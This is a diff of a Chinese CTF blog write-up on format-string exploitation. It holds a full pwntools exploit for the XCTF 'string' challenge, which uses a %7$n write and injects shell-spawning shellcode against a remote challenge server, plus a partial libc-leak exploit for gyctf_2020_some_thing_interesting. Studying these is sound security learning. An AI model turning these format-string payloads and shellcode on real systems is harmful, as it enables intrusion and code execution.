@@ -24,8 +24,9 @@
 <meta property="og:description" content="xctf-pwn string">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://isolator-1.github.io/img/FormatString/1.png">
+<meta property="og:image" content="https://isolator-1.github.io/img/FormatString/2.jpg">
 <meta property="article:published_time" content="2023-10-23T05:48:00.000Z">
-<meta property="article:modified_time" content="2023-10-23T06:04:52.034Z">
+<meta property="article:modified_time" content="2023-11-14T03:11:41.661Z">
 <meta property="article:author" content="Isolator">
 <meta property="article:tag" content="ctf-pwn">
 <meta name="twitter:card" content="summary_large_image">
@@ -221,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k words
+          2.2k words
         
       </span>
     
@@ -232,7 +233,7 @@
         
         
         
-          14 mins
+          19 mins
         
       </span>
     
@@ -275,8 +276,8 @@
             
               <div class="markdown-body">
                 
-                <p><img src="/img/FormatString/1.png" srcset="/img/loading.gif" lazyload></p>
-<h4 id="xctf-string"><a href="#xctf-string" class="headerlink" title="xctf string"></a>xctf string</h4><p>简单的格式化字符串</p>
+                <h4 id="xctf-string"><a href="#xctf-string" class="headerlink" title="xctf string"></a>xctf string</h4><p><img src="/img/FormatString/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>简单的格式化字符串</p>
 <p>这道题目需要注意的点包括</p>
 <ol>
 <li><p>题目中用%x打印出来的地址，可以直接用<code>int(...,16)</code>来接收，不要用ljust那一套。。。（-_-||</p>
@@ -289,6 +290,17 @@
 </ol>
 <p>exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./1d3c852354df4609bf8e56fe8e9df316&quot;)</span><br>p = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>, <span class="hljs-number">58702</span>)<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>e = ELF(<span class="hljs-string">&quot;./1d3c852354df4609bf8e56fe8e9df316&quot;</span>)<br><br><span class="hljs-comment">#gdb.attach(p, &quot;b *0x400d36&quot;)</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;secret[0] is &quot;</span>)<br>x0 = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(x0))<br><br>p.recvuntil(<span class="hljs-string">b&quot;What should your character&#x27;s name be:\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;123&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;So, where you will go?east or up?:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;east&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;go into there(1), or leave(0)?:\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;\&#x27;Give me an address\&#x27;\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(x0))<br><br>p.recvuntil(<span class="hljs-string">b&quot;And, you wish is:\n&quot;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">85</span> + <span class="hljs-string">b&quot;%7$n&quot;</span><br><span class="hljs-comment">#payload = b&#x27;aaaaaaaa&#x27; + b&quot;%p%p%p%p-%p%p%p%p-%p%p%p%p-%p%p%p%p&quot;</span><br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">b&quot;That&#x27;s sound terrible! you meet final boss!but you level is ONE!\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Wizard: I will help you! USE YOU SPELL\n&quot;</span>)<br><br><span class="hljs-comment">#shellcode = &#x27;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&#x27;</span><br><br>shellcode = asm(shellcraft.sh())<br><br><br>p.sendline(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="gyctf-2020-some-thing-interesting"><a href="#gyctf-2020-some-thing-interesting" class="headerlink" title="gyctf_2020_some_thing_interesting"></a>gyctf_2020_some_thing_interesting</h4><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#gyctf_2020_some_thing_interesting">https://buuoj.cn/challenges#gyctf_2020_some_thing_interesting</a></p>
+<p>本地运行不起来，不知道是什么原因。</p>
+<p>直接在栈上泄露返回<code>__libc_start_main</code>的偏移地址，算出libc</p>
+<p>参考 <a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/114643601">https://blog.csdn.net/mcmuyanga/article/details/114643601</a></p>
+<p><img src="/img/FormatString/2.jpg" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">r.recvuntil(<span class="hljs-string">&quot;&gt; Input your code please:&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;OreOOrereOOreO%17$p&quot;</span>)	<span class="hljs-comment">#elf 11 libc 17</span><br><br>r.recvuntil(<span class="hljs-string">&quot;#######################\n&quot;</span>)<br>r.sendline(<span class="hljs-string">&#x27;0&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&quot;# Your Code is &quot;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br><br>start_main = <span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0xf0</span><br>libc.address = start_main - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br></code></pre></td></tr></table></figure>
+
+
 
 
                 
